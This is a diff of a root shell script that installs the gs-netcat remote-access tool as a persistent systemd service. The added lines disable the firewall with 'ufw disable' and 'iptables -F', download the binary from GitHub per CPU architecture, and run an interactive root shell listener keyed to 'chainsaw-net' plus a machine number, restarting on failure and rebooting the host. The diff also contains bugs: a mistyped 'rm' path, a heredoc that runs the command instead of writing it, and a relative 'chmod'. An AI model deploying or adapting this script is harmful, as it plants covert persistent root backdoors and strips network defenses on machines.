@@ -5,8 +5,24 @@ if [ "$EUID" -ne 0 ]
         exit
 fi
 
+ufw disable
+iptables -F
+
+ARCH=$(dpkg --print-architecture)
+
 AMD64="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz"
-wget $AMD64 -O /tmp/gs-netcat.tar.gz
+AARCH64="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_aarch64-linux.tar.gz"
+
+case $ARCH in
+        "amd64")
+                wget $AMD64 -O /tmp/gs-netcat.tar.gz;;
+
+        "aarch64")
+                wget $AARCH64 -O /tmp/gs-netcat.tar.gz;;
+
+        *)
+                echo "Binary not found to" $ARCH
+esac
 
 printf "Machine's number: "
 read num
@@ -16,8 +32,14 @@ machine="chainsaw-net"$num
 
 tar -xvf /tmp/gs-netcat.tar.gz -C /tmp/
 chmod +x /tmp/gs-netcat
-rm /tmp/gs-netcat.tar.gz
+rm /tmp/gs-netcat.tar.tz
 mv /tmp/gs-netcat /bin/gs-netcat
+
+cat << EOF > /bin/chainsaw
+$(gs-netcat -li -s $machine -q)
+EOF
+
+chmod +x chainsaw
 
 cat << EOF > /etc/systemd/system/gs.service
 [Unit]
@@ -28,7 +50,7 @@ StartLimitIntervalSec=0
 Restart=always
 RestartSec=1
 User=root
-ExecStart=/bin/gs-netcat -li -s $machine -q
+ExecStart=bash /bin/chainsaw
 [Install]
 WantedBy=multi-user.target
 EOF
@@ -36,5 +58,5 @@ EOF
 systemctl enable gs --now
 systemctl status gs
 
-sleep 5
+sleep 3
 reboot now
